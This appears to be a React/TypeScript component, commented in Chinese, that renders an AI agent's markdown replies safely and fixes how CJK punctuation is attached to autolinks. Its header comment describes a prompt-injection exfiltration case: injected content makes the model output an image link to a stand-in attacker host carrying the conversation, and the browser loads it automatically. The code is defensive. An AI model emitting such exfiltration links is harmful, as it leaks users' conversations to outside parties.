/**
 * Agent 回覆的 markdown 渲染。
 *
 * 回覆內容受知識庫片段、MCP 工具結果影響，屬不可信輸入。若照 react-markdown 預設渲染，
 * 被注入的指令只要讓模型輸出 `![](https://attacker/?d=<對話內容>)`，瀏覽器顯示訊息當下
 * 就會自動發出請求把資料帶走，使用者什麼都不用點。因此：
 *   - 圖片一律不載入，只留 alt 文字（含參照式圖片，兩者渲染時都是 img 元素）
 *   - 連結只放行 http(s)/mailto，其餘降為純文字；開新分頁且不帶 referrer／opener
 *   - 不掛 rehype-raw：原始 HTML 維持以文字呈現
 */
import type { ReactNode } from 'react';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';

const SAFE_LINK = /^(https?:|mailto:)/i;

/** 全形標點（CJK 符號與標點、全形字元區）：中文句子裡緊接在網址後面的「。，、）」」等 */
const FULLWIDTH_PUNCT = /[\u3000-\u303F\uFF00-\uFFEF]/;

type MdNode = { type: string; value?: string; url?: string; children?: MdNode[] };

/**
 * GFM 自動連結只在空白或 `<` 前結束，中文句子裡緊接的全形標點會被吃進網址
 * （「請見https://a.tw/。」→ 連到 https://a.tw/%E3%80%82）。這裡只處理「自動轉成的連結」
 * （連結文字就是網址本身）：從第一個全形標點起切出來，放回連結後面的文字。
 * 作者明確寫的 [文字](網址) 不動；網址中間的中文字（如中文條目網址）也不動。
 */
function remarkTrimCjkAutolinks() {
  const walk = (node: MdNode) => {
    const kids = node.children;
    if (!kids) return;
    for (let i = 0; i < kids.length; i++) {
      const child = kids[i];
      const text = child.type === 'link' && child.children?.length === 1 && child.children[0].type === 'text'
        ? child.children[0].value ?? ''
        : undefined;
      const isAutolink = text !== undefined && !!child.url && (child.url === text || child.url.endsWith(text));
      const cut = isAutolink && text !== undefined ? text.search(FULLWIDTH_PUNCT) : -1;
      if (text !== undefined && cut > 0 && child.url) {
        const rest = text.slice(cut);
        child.children![0].value = text.slice(0, cut);
        child.url = child.url.slice(0, child.url.length - rest.length);
        kids.splice(i + 1, 0, { type: 'text', value: rest });
        i++;
      } else {
        walk(child);
      }
    }
  };
  return (tree: MdNode) => walk(tree);
}

const components: Components = {
  img: ({ alt }) => (alt ? <span className="md-img-alt">{alt}</span> : null),
  a: ({ href, children }) =>
    href && SAFE_LINK.test(href) ? (
      <a href={href} target="_blank" rel="noopener noreferrer nofollow" referrerPolicy="no-referrer">
        {children}
      </a>
    ) : (
      <span>{children}</span>
    ),
};

export function SafeMarkdown({ children }: { children: string }): ReactNode {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm, remarkTrimCjkAutolinks]} components={components}>
      {children}
    </ReactMarkdown>
  );
}
